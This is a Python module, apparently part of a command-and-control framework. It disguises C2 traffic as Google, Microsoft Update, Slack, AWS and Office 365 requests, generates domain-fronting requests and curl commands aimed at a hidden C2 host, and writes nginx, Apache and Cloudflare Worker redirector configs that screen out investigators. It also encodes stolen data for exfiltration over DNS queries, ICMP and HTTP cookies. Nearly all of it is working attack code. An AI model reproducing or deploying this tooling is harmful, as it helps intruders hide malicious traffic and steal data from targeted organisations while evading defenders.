"""
Traffic Masking & Proxy Support Module
Domain fronting, redirectors, and traffic obfuscation
"""
import base64
import random
import string
import json
import hashlib
import time
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
import urllib.parse


@dataclass
class ProxyConfig:
    """Proxy/redirector configuration"""
    proxy_type: str  # http, https, socks4, socks5
    host: str
    port: int
    username: Optional[str] = None
    password: Optional[str] = None


@dataclass  
class DomainFrontConfig:
    """Domain fronting configuration"""
    cdn_host: str      # Actual CDN endpoint (cloudfront.net)
    target_host: str   # Real C2 hidden behind SNI
    path: str = "/"


class TrafficMasker:
    """
    Traffic masking and covert channel techniques.
    
    Features:
    - Domain fronting configuration
    - Proxy/redirector chains
    - Traffic mimicry (look like legitimate apps)
    - Data encoding (base64, custom schemes)
    - Malleable C2 profiles
    """
    
    def __init__(self):
        self.profiles = self._load_profiles()
    
    def _load_profiles(self) -> Dict:
        """Load traffic mimicry profiles"""
        return {
            "google_search": {
                "name": "Google Search",
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0",
                "paths": ["/search", "/complete/search", "/async/newtab"],
                "params": ["q", "client", "sourceid", "ie", "oe"],
                "response_type": "text/html"
            },
            "ms_update": {
                "name": "Microsoft Update",
                "user_agent": "Windows-Update-Agent/10.0.19041.1",
                "paths": ["/v6/report", "/v7/update", "/metadata"],
                "params": ["platform", "build", "ring"],
                "response_type": "application/octet-stream"
            },
            "slack_api": {
                "name": "Slack API",
                "user_agent": "Slackbot 1.0 (+https://api.slack.com/robots)",
                "paths": ["/api/chat.postMessage", "/api/files.upload"],
                "params": ["token", "channel", "text"],
                "response_type": "application/json"
            },
            "aws_api": {
                "name": "AWS API",
                "user_agent": "aws-sdk-python/1.26.18",
                "paths": ["/_batch", "/_nodes", "/_search"],
                "params": ["Action", "Version", "X-Amz-Date"],
                "response_type": "application/json"
            },
            "office365": {
                "name": "Office 365",
                "user_agent": "Microsoft Office/16.0",
                "paths": ["/owa/service.svc", "/EWS/Exchange.asmx"],
                "params": ["realm", "client_id"],
                "response_type": "application/xml"
            }
        }
    
    def get_profile(self, name: str) -> Optional[Dict]:
        """Get traffic mimicry profile"""
        return self.profiles.get(name)
    
    def list_profiles(self) -> List[str]:
        """List available profiles"""
        return list(self.profiles.keys())
    
    def mask_request(self, data: bytes, profile_name: str = "google_search") -> Dict:
        """
        Mask C2 request to look like legitimate traffic.
        
        Args:
            data: Raw data to send
            profile_name: Traffic profile to mimic
            
        Returns:
            Dict with masked request parameters
        """
        profile = self.profiles.get(profile_name, self.profiles["google_search"])
        
        # Encode data
        encoded_data = self._encode_data(data)
        
        # Build request
        path = random.choice(profile["paths"])
        params = self._generate_fake_params(profile, encoded_data)
        
        return {
            "user_agent": profile["user_agent"],
            "path": path,
            "params": params,
            "headers": self._get_profile_headers(profile),
            "method": "GET" if len(encoded_data) < 2000 else "POST"
        }
    
    def _encode_data(self, data: bytes, method: str = "base64url") -> str:
        """Encode data for transmission"""
        if method == "base64url":
            return base64.urlsafe_b64encode(data).decode().rstrip('=')
        elif method == "hex":
            return data.hex()
        elif method == "base32":
            return base64.b32encode(data).decode().rstrip('=')
        else:
            return base64.b64encode(data).decode()
    
    def _decode_data(self, data: str, method: str = "base64url") -> bytes:
        """Decode received data"""
        if method == "base64url":
            # Add padding back
            padding = 4 - len(data) % 4
            if padding != 4:
                data += '=' * padding
            return base64.urlsafe_b64decode(data)
        elif method == "hex":
            return bytes.fromhex(data)
        elif method == "base32":
            padding = 8 - len(data) % 8
            if padding != 8:
                data += '=' * padding
            return base64.b32decode(data)
        else:
            return base64.b64decode(data)
    
    def _generate_fake_params(self, profile: Dict, real_data: str) -> Dict:
        """Generate fake parameters hiding real data"""
        params = {}
        
        # Add some real-looking params
        for param in profile["params"][:3]:
            if param == "q":
                # Hide data in search query
                params[param] = real_data
            elif param == "token":
                params[param] = "xoxb-" + ''.join(random.choices(string.digits, k=12))
            elif param == "client":
                params[param] = random.choice(["firefox", "chrome", "safari"])
            elif param == "platform":
                params[param] = "windows10"
            elif param == "Action":
                params[param] = "DescribeInstances"
            else:
                params[param] = ''.join(random.choices(string.ascii_lowercase, k=8))
        
        return params
    
    def _get_profile_headers(self, profile: Dict) -> Dict:
        """Get headers for profile"""
        headers = {
            "User-Agent": profile["user_agent"],
            "Accept": profile["response_type"],
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
        }
        
        if profile["name"] == "Slack API":
            headers["Authorization"] = f"Bearer xoxb-{''.join(random.choices(string.digits, k=12))}"
        elif profile["name"] == "AWS API":
            headers["X-Amz-Date"] = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
            headers["X-Amz-Content-SHA256"] = hashlib.sha256(b'').hexdigest()
        
        return headers


class DomainFronter:
    """
    Domain fronting implementation.
    Route traffic through CDN to hide real C2.
    """
    
    # Known domain fronting capable CDNs
    CDN_ENDPOINTS = {
        "cloudflare": {
            "hosts": ["*.cloudflare.com", "*.workers.dev"],
            "method": "host_header"
        },
        "cloudfront": {
            "hosts": ["*.cloudfront.net", "d111111abcdef8.cloudfront.net"],
            "method": "host_header"
        },
        "azure_cdn": {
            "hosts": ["*.azureedge.net", "*.vo.msecnd.net"],
            "method": "host_header"
        },
        "fastly": {
            "hosts": ["*.fastly.net", "*.global.ssl.fastly.net"],
            "method": "host_header"
        },
        "akamai": {
            "hosts": ["*.akamaiedge.net", "*.akamai.net"],
            "method": "host_header"
        }
    }
    
    def __init__(self, config: DomainFrontConfig = None):
        self.config = config
    
    def generate_fronted_request(self, data: bytes, 
                                  cdn: str = "cloudfront",
                                  real_host: str = None) -> Dict:
        """
        Generate domain-fronted request.
        
        Args:
            data: Data to send
            cdn: CDN to use for fronting
            real_host: Real C2 host (hidden in Host header)
        """
        cdn_config = self.CDN_ENDPOINTS.get(cdn, self.CDN_ENDPOINTS["cloudfront"])
        front_host = cdn_config["hosts"][0].replace("*", "front")
        
        return {
            "connect_host": front_host,  # SNI shows this
            "host_header": real_host or "real-c2.example.com",  # Real destination
            "path": "/api/data",
            "data": base64.b64encode(data).decode(),
            "headers": {
                "Host": real_host or "real-c2.example.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "Content-Type": "application/octet-stream"
            }
        }
    
    def get_curl_example(self, cdn: str = "cloudfront", 
                         real_host: str = "c2.example.com") -> str:
        """Generate curl command example for domain fronting"""
        cdn_config = self.CDN_ENDPOINTS.get(cdn, self.CDN_ENDPOINTS["cloudfront"])
        front_host = cdn_config["hosts"][0].replace("*", "d123456789")
        
        return f'''
# Domain Fronting via {cdn}
# SNI shows: {front_host}
# Host header (real destination): {real_host}

curl -v \\
  --connect-to {front_host}:443:{front_host}:443 \\
  -H "Host: {real_host}" \\
  -H "User-Agent: Mozilla/5.0" \\
  https://{front_host}/beacon/checkin

# Or with resolve:
curl -v \\
  --resolve {real_host}:443:$(dig +short {front_host} | head -1) \\
  https://{real_host}/beacon/checkin
'''


class RedirectorChain:
    """
    Multi-hop redirector chain configuration.
    Route traffic through multiple redirectors.
    """
    
    def __init__(self):
        self.redirectors: List[Dict] = []
    
    def add_redirector(self, host: str, port: int, 
                       protocol: str = "https",
                       auth: Optional[Tuple[str, str]] = None):
        """Add redirector to chain"""
        self.redirectors.append({
            "host": host,
            "port": port,
            "protocol": protocol,
            "auth": auth
        })
    
    def generate_nginx_config(self, final_c2: str) -> str:
        """
        Generate nginx config for redirector.
        """
        config = f'''
# Nginx Redirector Configuration
# Forwards traffic to: {final_c2}

server {{
    listen 443 ssl;
    server_name _;
    
    ssl_certificate /etc/nginx/ssl/cert.pem;
    ssl_certificate_key /etc/nginx/ssl/key.pem;
    
    # Only allow specific User-Agents (your beacon)
    if ($http_user_agent !~* "(Mozilla|Chrome|Firefox)") {{
        return 404;
    }}
    
    # Only allow specific paths
    location /api/ {{
        proxy_pass https://{final_c2};
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        
        # Strip identifying headers
        proxy_hide_header X-Powered-By;
        proxy_hide_header Server;
    }}
    
    # Everything else gets rickrolled
    location / {{
        return 302 https://www.youtube.com/watch?v=dQw4w9WgXcQ;
    }}
}}
'''
        return config
    
    def generate_apache_config(self, final_c2: str) -> str:
        """Generate Apache mod_rewrite redirector config"""
        config = f'''
# Apache Redirector Configuration
# mod_rewrite rules for C2 redirector

RewriteEngine On

# Block direct IP access
RewriteCond %{{HTTP_HOST}} ^[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+$
RewriteRule .* - [F]

# Only allow valid User-Agents
RewriteCond %{{HTTP_USER_AGENT}} !^Mozilla [NC]
RewriteRule .* - [F]

# Forward beacon traffic to C2
RewriteCond %{{REQUEST_URI}} ^/api/
RewriteRule ^(.*)$ https://{final_c2}/$1 [P,L]

# Redirect everything else
RewriteRule .* https://www.microsoft.com [R=302,L]
'''
        return config
    
    def generate_cloudflare_worker(self, final_c2: str) -> str:
        """Generate Cloudflare Worker redirector"""
        worker = f'''
// Cloudflare Worker C2 Redirector
// Deploy at: https://your-worker.your-subdomain.workers.dev

const REAL_C2 = "{final_c2}";
const VALID_UA_PATTERN = /Mozilla|Chrome/i;
const VALID_PATHS = ["/api/", "/beacon/", "/c2/"];

addEventListener("fetch", event => {{
  event.respondWith(handleRequest(event.request))
}})

async function handleRequest(request) {{
  const ua = request.headers.get("user-agent") || "";
  const url = new URL(request.url);
  
  // Validate User-Agent
  if (!VALID_UA_PATTERN.test(ua)) {{
    return Response.redirect("https://www.microsoft.com", 302);
  }}
  
  // Validate path
  const validPath = VALID_PATHS.some(p => url.pathname.startsWith(p));
  if (!validPath) {{
    return Response.redirect("https://www.google.com", 302);
  }}
  
  // Forward to real C2
  const c2Url = `https://${{REAL_C2}}${{url.pathname}}${{url.search}}`;
  
  const modifiedRequest = new Request(c2Url, {{
    method: request.method,
    headers: request.headers,
    body: request.body
  }});
  
  return fetch(modifiedRequest);
}}
'''
        return worker


class DataExfiltration:
    """
    Covert data exfiltration channels.
    """
    
    @staticmethod
    def dns_encode(data: bytes, domain: str) -> List[str]:
        """
        Encode data as DNS queries for exfiltration.
        
        Args:
            data: Data to exfiltrate
            domain: Base domain for queries
            
        Returns:
            List of DNS queries to make
        """
        # Base32 encode (DNS-safe characters)
        encoded = base64.b32encode(data).decode().lower().rstrip('=')
        
        # Split into chunks (max 63 chars per label)
        chunk_size = 60
        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
        
        queries = []
        for i, chunk in enumerate(chunks):
            query = f"{i}.{chunk}.{domain}"
            queries.append(query)
        
        return queries
    
    @staticmethod
    def icmp_encode(data: bytes) -> List[bytes]:
        """
        Encode data for ICMP tunnel exfiltration.
        """
        # Split into ICMP-sized chunks
        chunk_size = 32  # Fit in ICMP payload
        chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
        return chunks
    
    @staticmethod
    def http_cookie_encode(data: bytes, cookie_name: str = "session") -> str:
        """
        Encode data as HTTP cookie for exfiltration.
        """
        encoded = base64.urlsafe_b64encode(data).decode().rstrip('=')
        return f"{cookie_name}={encoded}"


# Convenience functions
def get_traffic_masker() -> TrafficMasker:
    """Get traffic masker instance"""
    return TrafficMasker()


def get_domain_fronter(config: DomainFrontConfig = None) -> DomainFronter:
    """Get domain fronter instance"""
    return DomainFronter(config)
